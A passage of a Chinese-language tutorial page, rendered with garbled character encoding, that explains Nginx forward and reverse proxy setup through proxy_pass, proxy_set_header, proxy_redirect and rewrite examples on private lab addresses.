src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589729000713.png" alt="1589729000713" /></p><p>(3)ä»£ç†æœåŠ¡å™¨è®¾ç½®ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><br>        <span class="hljs-attribute">listen</span>  <span class="hljs-number">82</span>;<br>        <span class="hljs-attribute">resolver</span> <span class="hljs-number">8.8.8.8</span>;<br>        <span class="hljs-section">location</span> /&#123;<br>                <span class="hljs-attribute">proxy_pass</span> http://<span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>(4)æŸ¥çœ‹ä»£ç†æœåŠ¡å™¨çš„IP(192.168.23.132)å’ŒNginxé…ç½®ç›‘å¬çš„ç«¯å£(82)</p><p>(5)åœ¨å®¢æˆ·ç«¯é…ç½®ä»£ç†æœåŠ¡å™¨</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581847577947.png" alt="" /></p><p>(6)è®¾ç½®å®Œæˆåï¼Œå†æ¬¡é€šè¿‡æµè§ˆå™¨è®¿é—®æœåŠ¡ç«¯</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589729479920.png" alt="1589729479920" /></p><p>é€šè¿‡å¯¹æ¯”ï¼Œä¸Šä¸‹ä¸¤æ¬¡çš„æ—¥å¿—è®°å½•ï¼Œä¼šå‘ç°è™½ç„¶æˆ‘ä»¬æ˜¯å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯ï¼Œä½†æ˜¯å¦‚ä½•ä½¿ç”¨äº†ä»£ç†ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯èƒ½çœ‹åˆ°çš„åªæ˜¯ä»£ç†å‘é€è¿‡å»çš„è¯·æ±‚ï¼Œè¿™æ ·çš„åŒ–ï¼Œå°±ä½¿ç”¨Nginxå®ç°äº†æ­£å‘ä»£ç†çš„è®¾ç½®ã€‚</p><p>ä½†æ˜¯Nginxæ­£å‘ä»£ç†ï¼Œåœ¨å®é™…çš„åº”ç”¨ä¸­ä¸æ˜¯ç‰¹åˆ«å¤šï¼Œæ‰€ä»¥æˆ‘ä»¬ç®€å•äº†è§£ä¸‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­å­¦ä¹ Nginxçš„åå‘ä»£ç†ï¼Œè¿™æ˜¯Nginxæ¯”è¾ƒé‡è¦çš„ä¸€ä¸ªåŠŸèƒ½ã€‚</p><h2 id="nginxåå‘ä»£ç†çš„é…ç½®è¯­æ³•"><a class="markdownIt-Anchor" href="#nginxåå‘ä»£ç†çš„é…ç½®è¯­æ³•"></a> Nginxåå‘ä»£ç†çš„é…ç½®è¯­æ³•</h2><p>Nginxåå‘ä»£ç†æ¨¡å—çš„æŒ‡ä»¤æ˜¯ç”±<code>ngx_http_proxy_module</code>æ¨¡å—è¿›è¡Œè§£æï¼Œè¯¥æ¨¡å—åœ¨å®‰è£…Nginxçš„æ—¶å€™å·²ç»è‡ªå·±åŠ è£…åˆ°Nginxä¸­äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æŠŠåå‘ä»£ç†ä¸­çš„å¸¸ç”¨æŒ‡ä»¤ä¸€ä¸€ä»‹ç»ä¸‹ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">proxy<span class="hljs-emphasis">_pass</span><br><span class="hljs-emphasis">proxy_set_header</span><br><span class="hljs-emphasis">proxy_</span>redirect<br></code></pre></td></tr></table></figure><h3 id="proxy_pass"><a class="markdownIt-Anchor" href="#proxy_pass"></a> proxy_pass</h3><p>è¯¥æŒ‡ä»¤ç”¨æ¥è®¾ç½®è¢«ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œå¯ä»¥æ˜¯ä¸»æœºåç§°ã€IPåœ°å€åŠ ç«¯å£å·å½¢å¼ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_pass URL;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>location</td></tr></tbody></table><p>URL:ä¸ºè¦è®¾ç½®çš„è¢«ä»£ç†æœåŠ¡å™¨åœ°å€ï¼ŒåŒ…å«ä¼ è¾“åè®®(<code>http</code>,<code>https://</code>)ã€ä¸»æœºåç§°æˆ–IPåœ°å€åŠ ç«¯å£å·ã€URIç­‰è¦ç´ ã€‚</p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">proxy_pass http:<span class="hljs-regexp">//</span>www.baidu.com;<br>location /server&#123;&#125;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>;<br>    http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span><span class="hljs-regexp">/server/i</span>ndex.html<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/;<br>    http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/index.html<br></code></pre></td></tr></table></figure><p>å¤§å®¶åœ¨ç¼–å†™proxy_passçš„æ—¶å€™ï¼Œåé¢çš„å€¼è¦ä¸è¦åŠ &quot;/&quot;?</p><p>æ¥ä¸‹æ¥é€šè¿‡ä¾‹å­æ¥è¯´æ˜åˆšæ‰æˆ‘ä»¬æåˆ°çš„é—®é¢˜ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name localhost;<br>location /&#123;<br><span class="hljs-comment">#proxy_pass http://192.168.23.132;</span><br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/;<br>&#125;<br>&#125;<br>å½“å®¢æˆ·ç«¯è®¿é—® http:<span class="hljs-regexp">//</span>localhost/index.html,æ•ˆæœæ˜¯ä¸€æ ·çš„<br>server&#123;<br>listen <span class="hljs-number">80</span>;<br>server_name localhost;<br>location /server&#123;<br><span class="hljs-comment">#proxy_pass http://192.168.23.132;</span><br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/;<br>&#125;<br>&#125;<br>å½“å®¢æˆ·ç«¯è®¿é—® http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/server/i</span>ndex.html<br>è¿™ä¸ªæ—¶å€™ï¼Œç¬¬ä¸€ä¸ªproxy_passå°±å˜æˆäº†http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/server/i</span>ndex.html<br>ç¬¬äºŒä¸ªproxy_passå°±å˜æˆäº†http:<span class="hljs-regexp">//</span>localhost/index.htmlæ•ˆæœå°±ä¸ä¸€æ ·äº†ã€‚<br></code></pre></td></tr></table></figure><h3 id="proxy_set_header"><a class="markdownIt-Anchor" href="#proxy_set_header"></a> proxy_set_header</h3><p>è¯¥æŒ‡ä»¤å¯ä»¥æ›´æ”¹NginxæœåŠ¡å™¨æ¥æ”¶åˆ°çš„å®¢æˆ·ç«¯è¯·æ±‚çš„è¯·æ±‚å¤´ä¿¡æ¯ï¼Œç„¶åå°†æ–°çš„è¯·æ±‚å¤´å‘é€ç»™ä»£ç†çš„æœåŠ¡å™¨</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_set_header field value;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_set_header Host $proxy_host;<br/>proxy_set_header Connection close;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæƒ³è¦çœ‹åˆ°ç»“æœï¼Œå¿…é¡»åœ¨è¢«ä»£ç†çš„æœåŠ¡å™¨ä¸Šæ¥è·å–æ·»åŠ çš„å¤´ä¿¡æ¯ã€‚</p><p>è¢«ä»£ç†æœåŠ¡å™¨ï¼š [192.168.23.132]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span>  <span class="hljs-number">8080</span>;<br>        <span class="hljs-attribute">server_name</span> localhost;<br>        <span class="hljs-attribute">default_type</span> text/plain;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-variable">$http_username</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç†æœåŠ¡å™¨: [192.168.200.133]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span>  <span class="hljs-number">8080</span>;<br>        <span class="hljs-attribute">server_name</span> localhost;<br>        <span class="hljs-section">location</span> /server &#123;<br>                <span class="hljs-attribute">proxy_pass</span> http://192.168.23.132:8080/;<br>                <span class="hljs-attribute">proxy_set_header</span> username TOM;<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>è®¿é—®æµ‹è¯•</p><h3 id="proxy_redirect"><a class="markdownIt-Anchor" href="#proxy_redirect"></a> proxy_redirect</h3><p>è¯¥æŒ‡ä»¤æ˜¯ç”¨æ¥é‡ç½®å¤´ä¿¡æ¯ä¸­çš„&quot;Location&quot;å’Œ&quot;Refresh&quot;çš„å€¼ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_redirect redirect replacement;<br/>proxy_redirect default;<br/>proxy_redirect off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_redirect default;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨è¯¥æŒ‡ä»¤?</p></blockquote><p>æœåŠ¡ç«¯[192.168.23.132]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>  <span class="hljs-number">8081</span>;<br>    <span class="hljs-attribute">server_name</span> localhost;<br>    <span class="hljs-attribute">if</span> (!-f <span class="hljs-variable">$request_filename</span>)&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">302</span> http://192.168.23.132;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä»£ç†æœåŠ¡ç«¯[192.168.200.133]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span>  <span class="hljs-number">8081</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://192.168.23.132:8081/;<br><span class="hljs-attribute">proxy_redirect</span> http://192.168.23.132 http://192.168.200.133;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¯¥æŒ‡ä»¤çš„å‡ ç»„é€‰é¡¹</p></blockquote><p>proxy_redirect redirect replacement;</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">redirect:</span>ç›®æ ‡,Locationçš„å€¼<br><span class="hljs-symbol">replacement:</span>è¦æ›¿æ¢çš„å€¼<br></code></pre></td></tr></table></figure><p>proxy_redirect default;</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-keyword">default</span>;<br>å°†<span class="hljs-keyword">location</span>å—çš„uriå˜é‡ä½œä¸ºreplacement,<br>å°†proxy_passå˜é‡ä½œä¸ºredirectè¿›è¡Œæ›¿æ¢<br></code></pre></td></tr></table></figure><p>proxy_redirect off;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">å…³é—­proxy_redirectçš„åŠŸèƒ½<br></code></pre></td></tr></table></figure><h2 id="nginxåå‘ä»£ç†å®æˆ˜"><a class="markdownIt-Anchor" href="#nginxåå‘ä»£ç†å®æˆ˜"></a> Nginxåå‘ä»£ç†å®æˆ˜</h2><h3 id="nginxåå‘ä»£ç†å®æˆ˜ä¸€"><a class="markdownIt-Anchor" href="#nginxåå‘ä»£ç†å®æˆ˜ä¸€"></a> Nginxåå‘ä»£ç†å®æˆ˜ä¸€</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118140544272.png" alt="image-20230118140544272" /></p><p>æœåŠ¡å™¨1,2,3å­˜åœ¨ä¸¤ç§æƒ…å†µ</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">ç¬¬ä¸€ç§æƒ…å†µ: ä¸‰å°æœåŠ¡å™¨çš„å†…å®¹ä¸ä¸€æ ·ã€‚</span><br><span class="hljs-section">ç¬¬äºŒç§æƒ…å†µ: ä¸‰å°æœåŠ¡å™¨çš„å†…å®¹æ˜¯ä¸€æ ·ã€‚</span><br></code></pre></td></tr></table></figure><ol><li>å¦‚æœæœåŠ¡å™¨1ã€æœåŠ¡å™¨2å’ŒæœåŠ¡å™¨3çš„å†…å®¹ä¸ä¸€æ ·ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ ¹æ®ç”¨æˆ·è¯·æ±‚æ¥åˆ†å‘åˆ°ä¸åŒçš„æœåŠ¡å™¨ã€‚</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ä»£ç†æœåŠ¡å™¨<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">8082</span>;<br>        server_name     localhost;<br>        <span class="hljs-keyword">location</span> /server1 &#123;<br>                proxy_pass http://<span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>/;<br>        &#125;<br>        <span class="hljs-keyword">location</span> /server2 &#123;<br>                proxy_pass http://<span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>/;<br>        &#125;<br>        <span class="hljs-keyword">location</span> /server3 &#123;<br>                proxy_pass http://<span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>/;<br>        &#125;<br>&#125;<br><br>æœåŠ¡ç«¯<br>server1<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">9001</span>;<br>        server_name     localhost;<br>        default_type <span class="hljs-type">text</span>/html;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;192.168.23.132:9001&lt;/h1&gt;&#x27;</span><br>&#125;<br>server2<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">9002</span>;<br>        server_name     localhost;<br>        default_type <span class="hljs-type">text</span>/html;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;192.168.23.132:9002&lt;/h1&gt;&#x27;</span><br>&#125;<br>server3<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">9003</span>;<br>        server_name     localhost;<br>        default_type <span class="hljs-type">text</span>/html;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;192.168.23.132:9003&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>å¦‚æœæœåŠ¡å™¨1ã€æœåŠ¡å™¨2å’ŒæœåŠ¡å™¨3çš„å†…å®¹æ˜¯ä¸€æ ·çš„ï¼Œè¯¥å¦‚ä½•å¤„ç†?</li></ol><h3 id="nginxåå‘ä»£ç†å®æˆ˜äºŒ"><a class="markdownIt-Anchor" href="#nginxåå‘ä»£ç†å®æˆ˜äºŒ"></a> Nginxåå‘ä»£ç†å®æˆ˜äºŒ</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118180222440.png" alt="image-20230118180222440" /></p><ol><li><p>æœåŠ¡å™¨æ˜¯pcæœ¬æœºå¼€å¯çš„ä¸€ä¸ªspringbooté¡¹ç›®</p></li><li><p>ä»£ç†æœåŠ¡å™¨</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#39010    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39010</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win &#123;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39011    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39011</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123; <span class="hljs-comment"># ç»“å°¾æœ‰/ ä¼šè‡ªåŠ¨é‡å®šå‘</span><br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39012    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39012</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win &#123;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39013    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39013</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#ä»¥ä¸ºä»£ç†ä¹‹åçš„rulåˆ†åˆ«ä¸º </span><br><span class="hljs-comment">#/win</span><br><span class="hljs-comment">#/win/</span><br><span class="hljs-comment">#/</span><br><span class="hljs-comment">#/</span><br></code></pre></td></tr></table></figure><p>è®¿é—®è·¯å¾„ä¸º <strong>linux.nginx:3901X/win</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118183908211.png" alt="image-20230118183908211" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184035753.png" alt="image-20230118184035753" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184104866.png" alt="image-20230118184104866" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184132855.png" alt="image-20230118184132855" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185716758.png" alt="" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184205181.png" alt="image-20230118184205181" /></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#39020    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39020</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#39021    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39021</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win/ &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#39022    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39022</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#39023    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39023</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win/ &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#ä»¥ä¸ºä»£ç†ä¹‹åçš„rulåˆ†åˆ«ä¸º </span><br>   <span class="hljs-comment">#/win</span><br>   <span class="hljs-comment">#/</span><br>   <span class="hljs-comment">#/</span><br>   <span class="hljs-comment">#/</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184644140.png" alt="image-20230118184644140" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184706432.png" alt="image-20230118184706432" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184725991.png" alt="image-20230118184725991" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184746175.png" alt="image-20230118184746175" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184832678.png" alt="image-20230118184832678" /></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#39030    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39030</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39031    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39031</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39032    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39032</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span> 